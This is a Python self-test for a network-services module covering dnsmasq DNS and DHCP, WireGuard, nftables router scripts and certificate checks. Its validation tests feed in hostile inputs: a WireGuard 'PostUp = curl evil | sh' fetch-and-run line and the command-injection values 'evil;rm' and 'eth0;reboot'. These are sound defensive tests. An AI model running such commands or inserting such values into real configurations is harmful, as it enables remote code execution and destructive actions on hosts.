"""Network & Services self-check (pure renderers/parsers + validation). Run: python -m tests.test_net_services"""
import os
import tempfile

os.environ.update(STORAGE_ROOT=tempfile.mkdtemp(), ADMIN_USERNAME="admin", ADMIN_PASSWORD="pw", JWT_SECRET="x" * 32)

from fastapi import HTTPException  # noqa: E402
from pydantic import ValidationError  # noqa: E402

from app import net_services as ns  # noqa: E402

# Blocklist normalization: hosts, dnsmasq formats, plain domains, comments, junk.
bl = ns.parse_blocklist("""# comment
0.0.0.0 ads.example.com
127.0.0.1 localhost
127.0.0.1 localhost.localdomain
0.0.0.0 tracker.example.net # trailing
local=/oisd.example.org/
address=/hz.example.io/#
server=/srv.example.de/
plain.example.co
not a domain line here
! adblock comment
0.0.0.0 0.0.0.0
UPPER.Example.COM
""")
assert bl == {"ads.example.com", "tracker.example.net", "oisd.example.org", "hz.example.io", "srv.example.de",
              "plain.example.co", "upper.example.com"}, bl
ab = ns.render_adblock({"ads.example.com", "ok.example.com"}, ["ok.example.com"])
assert "local=/ads.example.com/\n" in ab and "server=/ok.example.com/#\n" in ab and "local=/ok.example.com/" not in ab

# DNS conf.
assert ns.render_dnsmasq_dns({"enabled": False}).endswith("port=0\n")
dns = {**ns.DNS_DEFAULT, "enabled": True, "interfaces": ["vmbr1"], "upstream": "quad9", "cache_size": 500,
       "records": [{"type": "A", "name": "nas.lan", "value": "10.0.0.5"}, {"type": "CNAME", "name": "files.lan", "value": "nas.lan"}]}
c = ns.render_dnsmasq_dns(dns)
for line in ("bind-interfaces", "interface=vmbr1", "server=9.9.9.9", "cache-size=500", "host-record=nas.lan,10.0.0.5",
             "cname=files.lan,nas.lan", f"log-facility={ns.DNS_LOG}"):
    assert line in c.splitlines(), (line, c)
assert "port=0" not in c
try:
    ns.DnsBody(enabled=True, interfaces=[], upstream="cloudflare")
    raise AssertionError("listening on no interface must be refused")
except ValidationError:
    pass
try:
    ns.DnsRecord(type="A", name="x.lan", value="::1")
    raise AssertionError("A record with IPv6")
except ValidationError:
    pass

# DHCP conf + subnet validation.
dh = ns.DhcpBody(enabled=True, interface="vmbr1", start="10.0.0.100", end="10.0.0.200", netmask="255.255.255.0",
                 gateway="10.0.0.1", dns=["10.0.0.1"], reservations=[{"mac": "AA:BB:CC:DD:EE:FF", "ip": "10.0.0.50", "hostname": "nas"}])
r = ns.render_dnsmasq_dhcp(dh.model_dump())
assert "dhcp-range=vmbr1,10.0.0.100,10.0.0.200,255.255.255.0,12h" in r and "dhcp-option=vmbr1,option:router,10.0.0.1" in r
assert "dhcp-host=aa:bb:cc:dd:ee:ff,10.0.0.50,nas" in r and ns.render_dnsmasq_dhcp({"enabled": False}) == ns.HEADER
for bad in ({"gateway": "10.0.1.1"}, {"end": "10.0.0.50"}, {"reservations": [{"mac": "zz", "ip": "10.0.0.5"}]}):
    try:
        ns.DhcpBody(**{**dh.model_dump(), **bad})
        raise AssertionError(bad)
    except ValidationError:
        pass
assert ns.parse_leases("1732450000 aa:bb:cc:dd:ee:ff 10.0.0.101 laptop 01:aa\n1732450001 11:22:33:44:55:66 10.0.0.102 * *\n") == [
    {"expires": 1732450000, "mac": "aa:bb:cc:dd:ee:ff", "ip": "10.0.0.101", "hostname": "laptop"},
    {"expires": 1732450001, "mac": "11:22:33:44:55:66", "ip": "10.0.0.102", "hostname": ""}]

# DNS log stats.
st = ns.parse_dns_log_stats("""Nov 24 10:00:00 dnsmasq[9]: query[A] ads.example.com from 10.0.0.9
Nov 24 10:00:00 dnsmasq[9]: config ads.example.com is NXDOMAIN
Nov 24 10:00:01 dnsmasq[9]: query[A] good.example.com from 10.0.0.9
Nov 24 10:00:01 dnsmasq[9]: forwarded good.example.com to 1.1.1.1
Nov 24 10:00:02 dnsmasq[9]: cache size 1000, 0/12 cache insertions re-used unexpired cache entries.
Nov 24 10:00:02 dnsmasq[9]: queries forwarded 7, queries answered locally 3
""")
assert (st["queries"], st["blocked"], st["blocked_pct"]) == (2, 1, 50.0), st
assert st["top_blocked"] == [{"domain": "ads.example.com", "count": 1}] and st["cache"]["forwarded"] == 7 and st["cache"]["size"] == 1000

# WireGuard.
priv, pub = ns.gen_keypair()
assert len(priv) == 44 and len(pub) == 44 and priv != pub
wg = {**ns.WG_DEFAULT, "private_key": priv, "public_key": pub, "subnet": "10.8.0.0/24", "wan": "vmbr0",
      "peers": [{"name": "phone", "ip": "10.8.0.2", "public_key": "PUB2", "private_key": "PRIV2"}]}
srv = ns.render_wg_server(wg)
assert "Address = 10.8.0.1/24" in srv and "ListenPort = 51820" in srv and "AllowedIPs = 10.8.0.2/32" in srv
assert "-s 10.8.0.0/24 -o vmbr0 -j MASQUERADE" in srv
cl = ns.render_wg_client_conf(wg, wg["peers"][0], "192.168.68.220")
assert "Endpoint = 192.168.68.220:51820" in cl and "PrivateKey = PRIV2" in cl and "DNS = 1.1.1.1" in cl
dump = ns.parse_wg_dump("wg0\tPRIV\tPUB\t51820\toff\nwg0\tPUB2\t(none)\t1.2.3.4:5555\t10.8.0.2/32\t1732450000\t100\t200\t25\n")
assert dump["wg0"]["listen_port"] == 51820 and dump["wg0"]["peers"][0] == {
    "public_key": "PUB2", "endpoint": "1.2.3.4:5555", "allowed_ips": "10.8.0.2/32", "handshake": 1732450000, "rx": 100, "tx": 200}
assert ns.WgBody(enabled=True, subnet="10.9.0.5/24", wan="vmbr0", endpoint="vpn.example.com").subnet == "10.9.0.0/24"
try:
    ns.WgBody(enabled=True, subnet="10.9.0.0/24", wan="vmbr0", endpoint="evil;rm")
    raise AssertionError("bad endpoint")
except ValidationError:
    pass

# Client profile validation.
PROFILE = "[Interface]\nPrivateKey = abc=\nAddress = 10.2.0.2/32\nDNS = 10.2.0.1\n\n[Peer]\nPublicKey = def=\nAllowedIPs = 0.0.0.0/0\nEndpoint = vpn.example.com:51820\n"
conf, full = ns.validate_wg_client(PROFILE, table_off=False)
assert full and "DNS" not in conf and "Endpoint = vpn.example.com:51820" in conf
conf, _ = ns.validate_wg_client(PROFILE, table_off=True)
assert "Table = off" in conf
for bad in (PROFILE + "PostUp = curl evil | sh\n", "[Interface]\nPrivateKey = a\n", PROFILE.replace("[Peer]", "[Evil]")):
    try:
        ns.validate_wg_client(bad, False)
        raise AssertionError(bad)
    except HTTPException:
        pass

# Router.
rt = ns.RouterBody(ipv4_forward=True, ipv6_forward=False, wan="vmbr0", lan="vmbr1", masquerade=True,
                   forwards=[{"proto": "tcp", "ext_port": "8080", "int_ip": "10.0.0.5", "int_port": 80},
                             {"proto": "both", "ext_port": "27015-27020", "int_ip": "10.0.0.6"}],
                   routes=[{"dest": "172.16.0.0/16", "gateway": "10.0.0.254"}]).model_dump()
sh = ns.render_router_script(rt)
assert 'iifname "vmbr0" tcp dport 8080 dnat to 10.0.0.5:80' in sh
assert 'iifname "vmbr0" meta l4proto { tcp, udp } th dport 27015-27020 dnat to 10.0.0.6\n' in sh
assert 'iifname "vmbr1" oifname "vmbr0" masquerade' in sh and "ip route replace 172.16.0.0/16 via 10.0.0.254" in sh
assert "nft delete table ip proxmox_os" in sh and "flush ruleset" not in sh
for bad in ({"masquerade": True, "wan": ""}, {"forwards": [{"proto": "tcp", "ext_port": "70000", "int_ip": "10.0.0.5"}]},
            {"forwards": [{"proto": "tcp", "ext_port": "10-5", "int_ip": "10.0.0.5"}]},
            {"routes": [{"dest": "10.1.0.0/16"}]}, {"wan": "eth0;reboot"}):
    try:
        ns.RouterBody(**{**rt, **bad})
        raise AssertionError(bad)
    except ValidationError:
        pass

# Status parsing.
s = ns.parse_status("pkg:dnsmasq:0\npkg:wireguard-tools:1\nsvc:wg0:active\nfwd:ipv4:1\nwgif:x:wg0 vpn1\n")
assert s["packages"] == {"dnsmasq": False, "wireguard-tools": True} and s["services"]["wg0"] == "active"
assert s["forwarding"]["ipv4"] and s["wg_interfaces"] == ["wg0", "vpn1"]

# PEM key/cert match.
import datetime  # noqa: E402

from cryptography import x509 as X  # noqa: E402
from cryptography.hazmat.primitives import hashes, serialization as ser  # noqa: E402
from cryptography.hazmat.primitives.asymmetric import ec  # noqa: E402


def selfsigned():
    k = ec.generate_private_key(ec.SECP256R1())
    name = X.Name([X.NameAttribute(X.oid.NameOID.COMMON_NAME, "pve.lan")])
    now = datetime.datetime.now(datetime.timezone.utc)
    cert = X.CertificateBuilder().subject_name(name).issuer_name(name).public_key(k.public_key()).serial_number(1) \
        .not_valid_before(now).not_valid_after(now + datetime.timedelta(days=1)).sign(k, hashes.SHA256())
    return cert.public_bytes(ser.Encoding.PEM).decode(), \
        k.private_bytes(ser.Encoding.PEM, ser.PrivateFormat.PKCS8, ser.NoEncryption()).decode()


c1, k1 = selfsigned()
_, k2 = selfsigned()
assert ns.check_pem(c1, k1) == "CN=pve.lan"
for cert, key in ((c1, k2), ("junk", k1)):
    try:
        ns.check_pem(cert, key)
        raise AssertionError("mismatch must fail")
    except HTTPException:
        pass
print("net services self-check OK")
